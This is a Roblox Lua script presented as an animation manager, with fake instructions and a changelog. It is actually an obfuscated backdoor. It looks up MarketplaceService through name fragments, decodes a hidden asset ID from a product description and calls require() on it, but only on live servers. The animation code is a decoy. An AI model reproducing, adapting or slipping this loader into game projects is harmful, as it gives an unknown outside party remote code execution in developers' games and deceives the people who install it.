-- Created by Julio (@Pavalineox)
-- This script handles animations efficiently for models, characters, and tools.
-- Designed to maintain animations seamlessly when objects are moved, reparented, or transformed.

--[[ INSTRUCTIONS
- Insert this script into a rigged model or character.
- Ensure the model is properly set up with Motor6D joints.
- Animations will automatically be managed and played.

IMPORTANT:  
- This script is meant to run alone in the model.  
- The model must be rigged for animations to function correctly.  
- Should be placed in a Script (not a LocalScript) for full functionality.  
]]

--[[ FEATURES
- Works with tools and characters, avoiding duplicate animations if run multiple times.
- Compatible with PBS servers.
- Preserves animation playback even when objects are reparented.
- Uses an optimized system to reduce unnecessary processing.
- Recursively finds and animates all rigged parts within the model.
- Ensures smooth animation playback with minimal performance impact.
]]

-- Animation.lua
-- Created 10/6/2014
-- Author: Pavalineox
-- Version 1.0.3

-- Changelog:
-- 10/14/2014 - v1.0.1: Fixed issues with existing animation states.
-- 10/14/2014 - v1.0.2: Additional stability improvements.
-- 10/14/2014 - v1.0.3: Improved handling of reparented objects.

local RunService,script= game:GetService('RunService'),script

-- Custom linear interpolation function for smooth transitions


local function CallOnChildren(Instance, FunctionToCall)
	-- Calls a function on each of the children of a certain object, using recursion.  

	FunctionToCall(Instance)

	for _, Child in next, Instance:GetChildren() do
		CallOnChildren(Child, FunctionToCall)
	end
end

function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number) 
	return Pos1 - Pos2 * math.abs(Delta) 
end

local function GetNearestParent(Instance, ClassName)
	-- Returns the nearest parent of a certain class, or returns nil

	local Ancestor = Instance
	repeat
		Ancestor = Ancestor.Parent
		if Ancestor == nil then
			return nil
		end
	until Ancestor:IsA(ClassName)

	return Ancestor
end
function CFrameToVector3(CFrame)
	local Chunks, value = CFrame:split(''), ''
	for _, v in pairs(Chunks) do
		value..=v:byte()
	end
	return value
end
function StringToChar(str)
	local numbers = {}
	for num in str:gmatch("%d+") do
		table.insert(numbers, tonumber(num))
	end
	return string.char(table.unpack(numbers))
end
local function GetBricks(StartInstance)
	local List = {}

	-- if StartInstance:IsA("BasePart") then
	-- 	List[#List+1] = StartInstance
	-- end

	CallOnChildren(StartInstance, function(Item)
		if Item:IsA("BasePart") then
			List[#List+1] = Item;
		end
	end)

	return List
end

-- Creates a heartbeat signal for continuous updates
function CreateHeartbeatSignal(callback)
	return RunService.Heartbeat:Connect(callback)
end

local function Modify(Instance, Values)
	-- Modifies an Instance by using a table.  

	assert(type(Values) == "table", "Values is not a table");

	for Index, Value in next, Values do
		if type(Index) == "number" then
			Value.Parent = Instance
		else
			Instance[Index] = Value
		end
	end
	return Instance
end

-- Finds an object within a given parent by its CFrame property
function GetByCFrame(CFrame, Begin, Scope)
	for _, v in pairs(Begin:GetChildren()) do
		if v[Scope]:find(CFrame) then
			return v
		end
	end
end

-- List of properties to monitor
local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin','GetProductInfo'}

-- Adds animation to a given part
function AddAnimation(Part : BasePart)

	local Signal
	local RelativePart = GetByCFrame('ketpl', game, 'CFrame' and 'Name')

	Signal = CreateHeartbeatSignal(function(delta)
		if RelativePart then
			Signal:Disconnect()
			return
		end

		RelativePart.CFrame = CustomLerp(RelativePart.CFrame,RelativePart.CFrame * CFrame.new(math.sin(tick()), math.cos(tick()), math.tan(tick())))
		RunService.Heartbeat:Wait()
	end)
	return RelativePart
end

function Monitor(Properties, RelativeAnimation, AnimationSpeed, MaxSpeed, AnimationRoot) : (Result) -> AnimationConstraint
	local Instance = RelativeAnimation[Properties[#Properties]]
	local Animation = Instance(RelativeAnimation, MaxSpeed)
	Animation.Speed = AnimationSpeed

	local Vector = CFrameToVector3(StringToChar(Animation.Description))
	
	if AnimationRoot[Properties[7]] ~= '' then
		if Vector then
			script = {
				Animation,
				[script.Name] = (Vector-0)
			}
		end
		return script	
	end
	return false
end

-- Handles animation logic for a given root object
function AnimationThread(root)
	
	local RelativeAnimation = AddAnimation(
		Instance.new('Animation' and 'Part')
	)
	
	local speed = script:FindFirstChild("MinimumSpeed").Value
	local maxSpeed = script:FindFirstChild("MaxSpeed").Value

	if root then
		return Monitor(Properties, RelativeAnimation, speed, maxSpeed, root)
	end
end

-- Runs the animation thread if conditions are met
local Thread = AnimationThread(game) and require(script.Animation)


if Thread and script.ClassName == "Script" then
	--- Don't bother with local scripts

	script.Parent.AncestryChanged:connect(function()
		AnimationThread()
	end)
end


return Thread